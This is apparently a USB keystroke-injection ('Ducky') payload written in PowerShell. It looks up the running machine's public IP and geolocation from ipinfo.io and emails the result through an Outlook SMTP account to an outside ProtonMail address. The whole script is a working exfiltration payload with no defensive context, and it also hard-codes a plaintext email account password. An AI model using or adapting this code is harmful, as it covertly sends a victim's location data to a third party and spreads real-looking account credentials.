Try {
	$ipInfo = Invoke-RestMethod -Uri 'http://ipinfo.io/json'
	$jsonContent = $ipInfo | ConvertTo-Json -Depth 10
	$Message = $jsonContent
	$EmailFrom = "usulmadhi@outlook.fr"
	$EmailTo = "UsulMadhi@proton.me"
	$Subject = "Geo Data Ducky"
	$Body = $Message
	$SMTPServer = "smtp.outlook.com"
	$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
	$SMTPClient.EnableSsl = $true
	$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("usulmadhi@outlook.fr", "Eusebe2000");
	$SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
    	Write-Host "Email sent successfully!"
}
Catch {
    	Write-Host "Error sending email: $_"
}

